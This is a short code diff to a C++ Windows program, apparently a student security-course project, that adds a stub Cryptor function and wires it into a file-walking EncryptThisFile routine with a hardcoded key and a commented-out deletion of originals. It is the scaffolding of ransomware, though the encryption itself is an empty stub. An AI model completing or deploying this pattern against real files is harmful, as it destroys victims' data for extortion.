@@ -6,7 +6,13 @@
 #include <iostream>
 #include <filesystem>
 #include <windows.h>
+//#include <bcrypt.h>
+
+
+
 namespace fs = std::experimental::filesystem;
+
+#define CLASSNAME = "uwbcss579";
 
 bool ExcludePath(std::string checkString)
 {
@@ -25,12 +31,27 @@ bool ExcludePath(std::string checkString)
 	return false;
 }
 
+bool Cryptor(std::string fileToEncrypt, std::string fileToSave, std::string key)
+{
+
+	//BCryptOpenAlgorithmProvider()
+
+
+	return true;
+
+}
+
 bool EncryptThisFile(std::string path)
 {
 	std::cout << "Encrypting " << path << " ..." << std::endl;
 
+	Cryptor(path, path.append("encrypted"), "passwordkey");
+	
+	//DeleteFile((LPCWSTR)path.c_str);
+	
 	return true;
 }
+
 
 DWORD FindFiles()
 {
